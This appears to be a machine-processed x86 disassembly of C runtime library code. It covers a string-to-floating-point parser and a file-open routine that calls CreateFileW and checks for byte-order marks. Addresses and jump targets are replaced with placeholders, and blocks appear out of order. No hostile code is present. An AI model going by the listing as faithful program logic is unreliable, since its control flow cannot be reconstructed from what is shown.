lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10038a03
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_100390cb ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1003ae72
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_100390fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_10039fe6
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_1002973e
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1002972b
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_10036fc0
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1002973e
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1002972b
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_1002972b
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_10029751
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_10029751
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1002972b
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_10036d7b
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_1002f6f7
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
mov [ ebp - 0x24 ] ebx
call sub_10030627
add esp 0xc
test eax eax
jne r-xdata
call sub_1002973e
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_1002f6f7
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
push [ esi ]
call sub_1002ff78
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_10029751
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_10036dfc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_10039d74
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_10030627
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_10035bda
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_10035bda
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_1002ff78
pop ecx
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_1002f6f7
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
